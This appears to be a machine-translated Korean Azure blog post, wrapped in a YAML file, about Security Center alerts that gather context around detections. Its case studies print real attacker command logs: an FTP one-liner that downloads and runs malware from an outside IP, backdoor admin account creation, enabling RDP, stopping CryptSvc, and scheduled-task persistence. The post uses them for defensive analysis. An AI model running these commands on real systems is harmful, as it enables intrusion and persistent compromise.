@@ -1,0 +1,176 @@
+### YamlMime:Yaml
+ms.openlocfilehash: a83f7d22f49f96f183caf3e333f488104ecd4803
+ms.sourcegitcommit: d03bdc7fe5447adb6530886aab848b75fe8fa8ee
+ms.translationtype: MT
+ms.contentlocale: ko-KR
+ms.lasthandoff: 03/11/2022
+ms.locfileid: "139897777"
+Slug: azure-security-center-adds-context-alerts-to-aid-threat-investigation
+Title: Azure Security Center는 위협 조사를 지원하기 위해 컨텍스트 경고를 추가합니다.
+Summary: 그렉 코팅엄과 제센 쿠리엔은 최근 두 번의 기사에서 보안 경고에 의해 트리거되는 조사 프로세스를 설명했습니다. 아직 수행하지 않은 경우 "Azure Security Center가 도움이 되는 방법...을 참조하세요.
+Content: >-
+  <p>그렉 코팅엄과 제센 쿠리엔은 최근 두 번의 기사에서 보안 경고에 의해 트리거되는 조사 프로세스를 설명했습니다. 아직 그렇게 하지&#39;경우 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">Azure Security Center가 사이버 공격을</a>&rdquo; &ldquo; 공개하는 방법과 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/" target="_blank">Azure Security Center가 비트코인 마이닝 공격을 감지하는 방법을</a> 읽어 &ldquo; 보세요.&rdquo; 당신이 그들을 읽은&#39;경우이 게시물은 훨씬 더 의미가 있습니다. 이 문서에서 작성자는 로그의 배경 정보가 공격에 대한 심층적인 이해를 제공하는 데 어떻게 도움이 되었는지 설명합니다. 일단 이해되면 보안 침입을 차단하고 유사한 인시던트 재발을 방지하기 위해 적절한 수정 작업 집합을 식별할 수 있습니다.</p>
+
+
+  <p>이러한 종류의 조사 프로세스는 고객이 복제하기 어려운 경우가 많습니다. 무엇을 찾아야 할지 알기 위해서는 많은 전문 지식이 필요합니다. 대부분의 회사는 급여에 그렉과 제센 같은 보안 전문가가 없는&rsquo;, 그리고 모든 보고서에서, 그들은 고용하는 것은 매우 비싸다! 또한 이 프로세스는 시간이 오래 걸리며, 공격자&rsquo; 활동을 정확히 파악하기 위해 다음 힌트, 쿼리 작성 및 조정 및 데이터 해석에 몇 시간 또는 며칠이 필요한 경우가 많습니다.</p>
+
+
+  <p>이 문제를 해결하기 위해 최근에 새로운 유형의 경고를 배포했습니다. 이 경고는 보안 조사 작업의 일부 측면을 자동화하고 공격 중 및 공격 직전에 시스템에서 발생한 다른 상황에 대해 고객에게 보다 관련성이 있는 컨텍스트를 제공하려고 시도합니다. 컨텍스트 수집은 보안 검색 경고가 보고될 때마다 트리거됩니다. 관련 컨텍스트가 발견되면 후속 &ldquo;의심스러운 동작&rdquo; 경고에 보고됩니다.</p>
+
+
+  <h2>Azure Security Portal의 예제</h2>
+
+
+  <p>이러한 경고 중 하나를 검토하여 경고에 포함된 내용과 보안 경고를 둘러싼 컨텍스트를 보다 자세히 파악하는 데 도움이 되는 방법을 알아봅니&rsquo;다. 컨텍스트 경고에는 다른 경고에 대한 추가 컨텍스트로 보고된 잠재적인 의심스러운 동작인 스냅 제목 &ldquo;이 있습니다.&rdquo;</p>
+
+
+  <p><a href="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/44960838-9e58-4e0a-a4c3-fa6c19aefc8f.png"><img alt="ContextCollectorScreenShot" border="0" height="907" src="https://azurecomcdn.azureedge.net/mediahandler/acomblog/media/Default/blog/af72a865-2652-4e8b-bcf6-ce71856387c8.png" style="border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px" title="ContextCollectorScreenShot" width="465"></a></p>
+
+
+  <p>위에 표시된 컨텍스트 경고에 몇 가지 설명이 주석으로 추가되었습니다. 원래 경고의 시간에 가까운 잠재적으로 흥미로운 이벤트의 시간 순서 목록으로 컴파일 된 세 개의 별도 컨텍스트 쿼리의 결과를 보여 줍니다.</p>
+
+
+  <p>이벤트 데이터를 요약된 형식으로 표시하지만 CONTEXTEVENTACTIVITY 필드의 내용을 복사하여 텍스트 편집기에 붙여넣으면 어떤 일이 일어나고 있는지 더 쉽게 확인할 수 있습니다. 대부분의 프로세스 실행 이벤트의 경우 각 줄에 다음 항목, 프로세스가 실행된 시간, 프로세스 이름, 프로세스 명령줄, 반복 시간 또는 개수 및 보고서 범주(일반적으로 &quot;UnusualProcess&quot; 또는 &quot;RDPLogon&quot;)가 표시됩니다. 반복 필드는 동일한 이벤트가 다른 시간에 반복되었는지를 알려줍니다. 반복이 3개 이하이면 시간이 기록되고, 3개를 초과하면 간단한 반복 횟수가 포함됩니다.</p>
+
+
+  <p>소수의 경고만 컨텍스트 보고서를 생성합니다. 이는 의심스러운 동작을 명시적으로 찾고 있으며&rsquo;, 찾을 수 없는 경우 보고서를 만들지 않기&rsquo; 때문입니다. 우리가 찾는 동작 유형은 실행 중인 비정상적인 명령과 비정상적인 실행 패턴입니다. 이들은 일반적으로 자체적으로 경고를 트리거하기에 충분히 의심스럽지 않지만 보안 검색 중 하나에서 긍정적 인 경고의 맥락에서 중요한 확증 증거를 제공 할 수 있습니다. 원래 경고와 함께 볼 때 공격 중에 발생한 일을 훨씬 더 자세히 파악할 수 있습니다.</p>
+
+
+  <h2>작동 원리</h2>
+
+
+  <p>앞서 설명한 것처럼 Azure Security Center가 새 검색에 대해 경고할 때 컨텍스트 서비스는 인간 조사자가 경고에 대해 묻는 것과 동일한 질문에 답하기 위해 트리거됩니다. 예를 들어 &quot;이 로그온 세션에서 다른 비정상적인 프로세스가 실행되었나요?&quot; 아니면 &quot;최근에 이 가상 머신에 로그온한 Who 있나요?&rdquo; 경고 유형 및 경고에서 사용할 수 있는 데이터 항목에 따라 다른 데이터 원본과 작업이 선택됩니다. 예를 들어 경고에 사용자 계정 세부 정보가 포함된 경우 경고가 있을 때 동일한 계정 세션에서 실행된 다른 항목을 조회하는 데 사용할 수 있습니다. 이러한 쿼리의 모든 관련 데이터는 Azure Security Center에서 의심스러운 동작 컨텍스트 경고로 출력됩니다.</p>
+
+
+  <h2>사례 연구</h2>
+
+
+  <p>다음은 그렉&#39;이전 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">게시물</a>에서 본 공격과 같은 예입니다. 컨텍스트 보고서는 <em>시스템의 보안 상태를 낮추기 위해 Cacls의 의심스러운 사용을 감지한</em> 경고 &ldquo; 에 의해 트리거되었습니다.&rdquo; 결과 컨텍스트 보고서는 세 가지 컨텍스트 작업의 출력을 시간 순서가 지정된 이벤트 집합으로 결합합니다. Ive&rsquo;는 반복을 줄이고 더 쉽게 읽을 수 있도록 세부 정보 중 일부를 제거했습니다.</p>
+
+
+  <div>
+
+  <pre class="prettyprint">
+
+  Alert Description: &quot;Related alert (dated 2017-04-21 09:37:47Z). 4 items in report (Unusual processes executed, RDP Logons, Supplemental processes executed, Unusual multi-processes commandline execution)&quot;,
+
+  ContextEventActivity:
+
+  00:47:44Z xxxxxxUser  175.143.245.210  (RDPLogon)
+
+  09:37:26Z &quot;C:\windows\system32\ftp.exe&quot; -s:C:\WINDOWS\system32\us.dat
+
+  09:37:32Z ftp -s:xpoffice.exe
+
+  09:37:32Z ftp -s:c:\RECYCLER\xpoffice.exe
+
+  09:37:33Z ftp -s:c:\xpoffice.exe
+
+  09:37:45Z &quot;C:\Windows\System32\net.exe&quot; stop CryptSvc
+
+  09:37:45Z &quot;C:\Windows\System32\regsvr32.exe&quot; urlmon.dll shdocvw.dll jscript.dll vbscript.dll /s
+
+  09:37:45Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\wscript.exe /e /t /g SYSTEM:F
+
+  [removed some items for brevity]...
+
+  09:37:46Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\cscript.exe /e /t /g SYSTEM:F
+
+  09:37:46Z &quot;C:\Windows\System32\cacls.exe&quot; C:\Windows\system32\ias\ias.mdb /e /t /g SYSTEM:F
+
+  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; localgroup administrators abai$/add
+
+  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; user www.401hk.com Www.401hk.com$
+
+  09:37:46Z &quot;C:\Windows\System32\net.exe&quot; user www.401hk.com/active:yes
+
+  09:37:46Z &quot;C:\Windows\System32\reg.exe&quot; ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;
+
+  [Report truncated...maximum number of items exceeded]
+
+  </pre>
+
+
+  <p>모든 이벤트 목록이 공격과 관련이 있는 것은 아니지만 위의 이벤트 추적에서 다음 활동을 확인할 수 있습니다.</p>
+
+
+  <ul>
+   <li>이 경우 관련이 없는 RDP 로그온입니다.</li>
+   <li>스크립치된 FTP 명령의 비정상적인 실행.</li>
+   <li>Windows Crypto 서비스를 종료합니다.</li>
+   <li>스크립팅 DLL 등록 일반적으로 서버에 등록되지는 않지만 공격에 의해 분명히 필요합니다.</li>
+   <li>cscript 및 wscript 실행 파일에 대한 사용 권한 설정</li>
+   <li>새 사용자 계정 만들기</li>
+   <li>RDP(터미널 서비스) 로그온에서 제한 제거</li>
+  </ul>
+
+
+  <p>슬프게도, 이 시점에서 우리는 공격의 전체 범위를 따라 공간이 부족하지만, 심지어 공간을 절약하기 위해 삭제 된 항목을 제외하고, 30 항목의이 코드 조각에서, 그것은 뭔가 특이하고 원치 않는 일이 일어나고 있다는 것을 매우 분명하다. 또 다른 마지막 단서는 이러한 이벤트의 타이밍입니다. 동일한 분 내에 실행되는 일련의 관련 없는 프로세스는 스크립션된 공격의 명확한 징후입니다.</p>
+
+
+  <p>이것은 <em>비정상적인</em> <em>프로세스 실행</em> 검색 경고를 기반으로 폭발물이 편집된 유사한 공격 패턴의 또 다른 흥미로운 변형입니다.</p>
+
+
+  <div>
+
+  <pre class="prettyprint">
+
+  11:44:09Z  &quot;C:\Windows\System32\regini.exe&quot; c:\windows\system32\1025\run.ini
+
+  11:44:09Z &quot;C:\Windows\System32\regini.exe&quot; c:\windows\system32\1025\runq.ini
+
+  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /cfg &quot;C:\WINDOWS\system32\NewAuto.inf&quot; /db newdb.sdb /log logfile.txt /areas REGKEYS FILESTORE
+
+  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /db secedit.sdb /cfg NewAuto.inf
+
+  11:44:16Z &quot;C:\Windows\System32\SecEdit.exe&quot; /configure /db secedit.sdb /cfg F***Gothin.inf
+
+  11:44:28Z &quot;C:\Windows\System32\cacls.exe&quot; cmd.exe /e /t /g system:f
+
+  11:44:28Z &quot;C:\Windows\System32\cacls.exe&quot; ftp.exe /e /t /g system:f
+
+  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; net.exe /e /t /g system:f
+
+  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; net1.exe /e /t /g system:f
+
+  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; wscript.exe /e /t /g system:f
+
+  11:44:29Z &quot;C:\Windows\System32\cacls.exe&quot; cscript.exe /e /t /g system:f
+
+  11:44:49Z &quot;C:\Windows\System32\net.exe&quot; stop CryptSvc
+
+  11:44:50Z &quot;C:\Windows\System32\regsvr32.exe&quot; urlmon.dll shdocvw.dll jscript.dll vbscript.dll /s  [Repeats: 11:44:50.82]
+
+  11:45:01Z &quot;C:\Windows\System32\ftp.exe&quot; -s:C:\MG05.dll
+
+  11:45:02Z &quot;C:\Windows\System32\schtasks.exe&quot; /create /tn &quot;45645&quot; /tr &quot;c:\Ttqlhcjntzllto.exe&quot; /sc minute /mo 1 /ru &quot;system
+
+  11:45:03Z &quot;C:\Windows\system32\cmd.exe&quot; /c net1 stop sharedaccess&amp;echo open 222.184.79.11 &gt; MG06.dll&amp;echo mix&gt;&gt; MG06.dll&amp;echo mix&gt;&gt; MG06.dll&amp;echo binary &gt;&gt; MG06.dll&amp;echo get Ttqlhcjntzllto.exe &gt;&gt; MG06.dll&amp;echo bye &gt;&gt; MG06.dll&amp;ftp -s:MG06.dll&amp;p -s:MG06.dll&amp;Ttqlhc....
+
+  11:45:03Z ftp  -s:MG06.dll
+
+  </pre>
+
+
+  <p>이는 <strong>regini.exe </strong>사용하여 대량 레지스트리 편집을 수행하고, <strong>secedit.exe </strong>사용하여 시스템 보안을 변경하고, 컴퓨터에 영구적인 발판을 확보할 가능성이 높은 예약된 작업을 만드는 방법을 보여 줍니다. 마지막 두 줄은 <strong>cmd.exe </strong>리디렉션을 사용하여 ftp 스크립트를 만든 다음 스크립트를 실행하여 맬웨어Ttqlhcjntzllto.exe. <strong> </strong> 이전 줄에서 마지막 줄에서 세 번째로 이 실행 파일은 예약된 작업으로 설치됩니다. 순서가 잘못된 것처럼 보이지만 공격 스크립트가 성공적으로 완료될 가능성이 높기 때문에 공격 스크립트가 반복적으로 실행되는 경우가 많기 때문에 이 스크립트의 두 실행의 시작과 끝을 포함하는 스냅샷을 볼&#39;있습니다.</p>
+
+
+  <h2>다음 내용&rsquo;</h2>
+
+
+  <p>이러한 보고서는 이미 경고에 대한 중요한 컨텍스트를 제공하지만, 포함된 데이터의 종류를 확장하고 출력을 더 스마트하게 만드는 방법에 대해 계속 구체화할 것입니다.</p>
+
+
+  <h2>자세히 알아보려면</h2>
+
+
+  <ul>
+   <li>Azure Security Center가 사이버 공격을 &mdash; 탐지하는 방법 및 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/" target="_blank">Azure Security Center</a> 가 <a href="https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/" target="_blank">비트코인 마이닝 공격을 감지하는 방법에</a> 대한 실제 사례를 사용하여 다른 블로그 게시물을 참조하세요.</li>
+   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-detection-capabilities" target="_blank">Azure Security Center 검색 기능</a> &mdash; Azure Security Centers&rsquo; 고급 검색 기능에 대해 알아봅니다.</li>
+   <li>Azure Security Center &mdash; <a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-managing-and-responding-alerts" target="_blank">에서 보안 경고 관리 및 대응</a> 보안 경고를 관리하고 대응하는 방법을 알아봅니다.</li>
+   <li><a href="https://docs.microsoft.com/en-us/azure/security-center/security-center-faq" target="_blank">Azure Security Center FAQ</a> &mdash; 서비스 사용에 대한 질문과 대답을 찾습니다.</li>
+  </ul>
+
+  </div>
+
+  </div>
